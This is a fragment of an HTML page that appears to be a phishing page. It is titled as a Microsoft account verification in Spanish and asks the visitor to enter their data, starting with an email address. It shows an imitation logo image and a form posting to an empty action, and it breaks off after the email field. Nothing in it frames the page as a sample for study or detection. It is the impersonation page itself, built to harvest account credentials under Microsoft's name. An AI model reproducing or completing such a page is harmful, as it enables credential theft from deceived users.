...
<html lang="en">
<head>
	<title>Verificacion de Cuenta Microsoft</title>
	<meta charset="UTF-8">
			...
			<div class="wrap-login100">
				<form method="post" action="" class="delform" >
					...
					<img src="css/logggo.png" style="width:200px;"><br><br>
						<span style="font-size: 1.3rem;  font-weight: 600;"><b>Ingrese sus datos para el proceso de verificación</b></span><br><br>
		
					<div class="wrap-input100 validate-input m-b-16" data-validate="Please enter username">
						<input class="input100" type="email" name="a" placeholder="Correo electrónico" required>
